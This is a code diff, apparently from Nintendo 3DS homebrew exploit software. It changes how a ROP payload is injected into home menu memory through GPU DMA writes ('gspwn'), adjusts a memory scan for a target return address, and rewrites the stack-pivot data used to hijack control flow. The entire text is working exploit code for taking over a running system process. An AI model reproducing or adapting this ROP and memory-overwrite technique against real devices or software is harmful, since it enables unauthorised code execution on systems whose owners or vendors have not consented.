@@ -847,10 +847,9 @@ int main(u32 loaderparam, char** argv)
 		svc_sleepThread(1000000); //sleep long enough for memory to be read
 
 		int i;
-		for(i = 0; i < block_size; i += 0x1000)
+		for(i = 0; i < block_size; i += 4)
 		{
-			const u32* adr = &linear_buffer[i / 4];
-			if(adr[0xfec / 4] == (block_start + i + 0xff8)) break;
+			if(linear_buffer[i / 4] == ROP_MENU_TARGET_RET) break;
 		}
 
 		if(i < block_size)
@@ -867,32 +866,32 @@ int main(u32 loaderparam, char** argv)
 
 	// // const u32 start_paddr = 0x20000000 + 0x04383000;
 	// const u32 start_paddr = 0x20000000 + 0x043A3000;
-	u32 rop_offset = 0x1000;
+	u32 rop_paddr = (start_paddr & ~0xfff) + 0x2000;
 
 	{
-		const u32 rop_paddr = start_paddr + rop_offset;
 
-		inject_payload(linear_buffer, PA_TO_VA(rop_paddr), ropbin_linear_buffer, (MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR) * 2, &rop_offset);
+		inject_payload(linear_buffer, PA_TO_VA(rop_paddr), ropbin_linear_buffer, (MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR) * 2, &rop_paddr);
 	}
 
 	{
-		const u32 block_size = 0x1000;
-		const u32 block_stride = block_size;
+		const u32 block_size = 0x200;
+		const u32 block_paddr = (start_paddr - 4 * 4) & ~0xff;
+		const u32 start_offset = start_paddr - block_paddr;
 
 		memset(linear_buffer, 0x00, block_size);
 
-		// stack pivot data
-		// ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
-		linear_buffer[0x6] = PA_TO_VA(start_paddr + rop_offset); // sp
-		linear_buffer[0x7] = ROP_MENU_POP_PC; // pc
 
 		// takeover stuff
-		linear_buffer[0xf84 / 4 - 4] = PA_TO_VA(start_paddr + 7 * 4);
-		linear_buffer[0xf84 / 4] = ROP_MENU_STACK_PIVOT;
+		linear_buffer[start_offset / 4 - 4] = PA_TO_VA(start_paddr + 8);
+		linear_buffer[start_offset / 4] = ROP_MENU_STACK_PIVOT;
+		// stack pivot data
+		// ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
+		linear_buffer[start_offset / 4 + 1] = PA_TO_VA(rop_paddr); // sp
+		linear_buffer[start_offset / 4 + 2] = ROP_MENU_POP_PC; // pc
 
 		GSP_FlushDCache(linear_buffer, block_size);
 
-		doGspwn(linear_buffer, (u32*)(PA_TO_VA(start_paddr)), block_size);
+		doGspwn(linear_buffer, (u32*)(PA_TO_VA(block_paddr)), block_size);
 		
 		svc_sleepThread(100000); //sleep long enough for memory to be read
 	}
